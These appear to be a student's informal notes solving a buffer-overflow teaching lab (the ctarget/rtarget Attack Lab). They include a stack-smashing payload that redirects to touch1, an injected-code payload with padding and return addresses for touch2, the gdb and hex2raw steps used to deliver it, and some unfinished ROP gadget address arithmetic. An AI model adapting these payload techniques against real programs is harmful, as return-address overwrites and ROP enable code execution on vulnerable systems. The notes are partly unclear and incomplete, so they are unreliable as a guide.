phase 1.)

command f on ctargetc, searched for touch 1, found touch 1, 0x18 of padding , then touch 1 has
address 0000000000401590 <touch1>:, and it is in little endian so you enter it in reverse

./hex2raw < answers.txt | ./ctarget


phase 2.) 
Phase 2 involves injecting a small code and calling function touch2 while making it look like you passed the
cookie as an argument to touch2

If you look inside the ctarget dump and search for touch2, it looks something like this:

go to rtarget.c , command f for touch2,
the first argument to a function is passed in register %rdi.

So our goal is to modify the %rdi register and store our cookie in there.

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 43 b2 29 3a 	mov    $0x3a29b243,%rdi
   7:	c3                   	retq   
   
   byte representation of the assembly code is 
   48 c7 c7 43 b2 29 3a c3
   
   now we need to find the address of rsp register 
   
   run ctarget through gdb 
   
   
   gdb ctarget 
   b getbuf //set breakpoint at getbuf
   r // run ctarget
   disas
   
   need to run the code until the instruction just below callq 0x... 
   until *
   type in a string same as buffer (24)
   
   x/s $rsp
   
   the address on the left side is what we want 
   
   created text file phase2.txt and put the bytes in reverse 
   
   48 c7 c7 70 4b 4b 43 c3 /*this sets your cookie*/
00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
d8 0c 62 55 00 00 00 00 /* address of register %rsp */
8c 17 40 00 00 00 00 00 /*address of touch2 function */

Run it through hex2raw

./hex2raw < phase2.txt > raw-phase2.txt

Finally, you run the raw file

./ctarget < raw-phase2.txt

What the exploit does is that first it sets register rdi to our cookie value is transferred to $rsp register so after we enter our string and getbuf tries to return control to the calling function, we want it to point to the rsp address so it will execute the code to set the cookie and finally we call touch2 after the cookie is set.

Phase 3





0000000000401799 <getval_471>:
  401799:	b8 e6 84 58 90       	mov    $0x905884e6,%eax
  40179e:	c3                   	retq   
  
  
  58 is in 4th byte(present in), so add 3 to address 401799 
  = 40179C
  
  
  0000000000401786 <setval_162>:
  401786:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  40178c:	c3                   	retq   

401786 + 0x2

401788
  